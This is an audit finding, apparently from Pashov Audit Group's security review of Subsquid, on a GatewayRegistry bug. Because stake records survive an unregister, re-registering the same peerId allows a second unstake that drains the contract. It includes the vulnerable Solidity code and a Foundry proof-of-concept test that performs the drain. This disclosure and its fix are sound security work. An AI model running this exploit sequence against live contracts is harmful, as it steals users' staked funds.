---
tags:
  - lang/solidity
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - sector/bridge
protocol: "[[Subsquid]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md"
genome:
  - "[[lockup]]"
  - "[[permanent]]"
  - "[[direct-drain]]"
  - "[[cross-contract-state-consistency]]"
---
# [C-01] Gateway creator can steal all tokens from the GatewayRegistry

- id: 58244
- impact: HIGH
- protocol: [[Subsquid]]
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md

## Summary


This bug report discusses a vulnerability in the `GatewayRegistry` contract that allows for the theft of user funds. The severity of this bug is high, as it can be exploited by anyone and is easy to implement. The likelihood of it being exploited is also high. 

The `GatewayRegistry` contract allows users to register and stake tokens into gateways in order to receive computation units (CUs). However, there is a problem with the code in which the `totalUnstaked` variable is not properly set to 0 when a gateway is registered. This allows for the following steps to be exploited: 

1. Stake tokens into the gateway 
2. Unregister the gateway 
3. Register a new gateway with the same `peerId` 
4. Since `totalUnstaked` is still set to 0, the user can unstake their tokens again 

This is due to the fact that the `stakes` mapping, which tracks all user stakes, is not deleted when a gateway is unregistered. This can be seen in the code for the `_unstakeable` function. 

To demonstrate this vulnerability, a proof of concept (POC) has been coded in the `GatewayRegistry.unstake.t.sol` file. This POC shows how a user can exploit this bug to steal funds from the contract. 

The recommendation to fix this bug is to delete the `stakes` mapping when a gateway is unregistered. This will prevent users from being able to exploit the bug and steal funds from the contract. 

## Details

## Severity

**Impact:** High, user's funds will be stolen

**Likelihood:** High, can be exploited by anyone and easy to implement

## Description

`GatewayRegistry` contract allows users to register and stake tokens into gateways to receive computation units CUs. First, the user registers a gateway,

```solidity
  function register(bytes calldata peerId, string memory metadata, address gatewayAddress) public whenNotPaused {
    require(peerId.length > 0, "Cannot set empty peerId");
    bytes32 peerIdHash = keccak256(peerId);
    require(gateways[peerIdHash].operator == address(0), "PeerId already registered");

    gateways[peerIdHash] = Gateway({
      operator: msg.sender,
      peerId: peerId,
      strategy: defaultStrategy,
      ownAddress: gatewayAddress,
      metadata: metadata,
      totalStaked: 0,
>>    totalUnstaked: 0
    });
```

note `totalUnstaked` is set to 0. After this we can stake tokens

```solidity
  function _stakeWithoutTransfer(bytes calldata peerId, uint256 amount, uint128 durationBlocks) internal {
    (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
    _requireOperator(gateway);

    uint256 _computationUnits = computationUnitsAmount(amount, durationBlocks);
    uint128 lockStart = router.networkController().nextEpoch();
    uint128 lockEnd = lockStart + durationBlocks;
>>  stakes[peerIdHash].push(Stake(amount, _computationUnits, lockStart, lockEnd));
```

`stakes` mapping is used to track all user stakes. The problem arises when we unregister the gateway, we do not delete the `stakes`, it can be exploited in the following steps:

- unstake tokens from the gateway
- unregister gateway
- register new gateway with the same `peerId`
- since `totalUnstaked = 0`, we can unstake tokens again

```solidity
  function _unstakeable(Gateway storage gateway) internal view returns (uint256) {
    Stake[] memory _stakes = stakes[keccak256(gateway.peerId)];
    uint256 blockNumber = block.number;
    uint256 total = 0;
    for (uint256 i = 0; i < _stakes.length; i++) {
      Stake memory _stake = _stakes[i];
      if (_stake.lockEnd <= blockNumber) {
        total += _stake.amount;
      }
    }
    return total - gateway.totalUnstaked;
  }
```

Here is the coded POC for `GatewayRegistry.unstake.t.sol `

```solidity
  function test_StealStakes() public {
    uint256 amount = 100;
    address alice = address(0xA11cE);
    token.transfer(alice, amount);

    // stakers stake into their gateways
    gatewayRegistry.stake(peerId, amount, 200);
    vm.startPrank(alice);
    token.approve(address(gatewayRegistry), type(uint256).max);
    gatewayRegistry.register(bytes("alice"), "", address(0x6a7e));
    gatewayRegistry.stake(bytes("alice"), amount, 200);

    assertEq(token.balanceOf(address(gatewayRegistry)), 200);
    // exploit
    vm.roll(block.number + 300);
    gatewayRegistry.unstake(bytes("alice"), amount);
    gatewayRegistry.unregister(bytes("alice"));
    gatewayRegistry.register(bytes("alice"), "", address(0x6a7e));
    // unstake again
    gatewayRegistry.unstake(bytes("alice"), amount);
    assertEq(token.balanceOf(address(gatewayRegistry)), 0);
  }
```

## Recommendations

Delete `stakes` mapping when gateway is being unregistered.
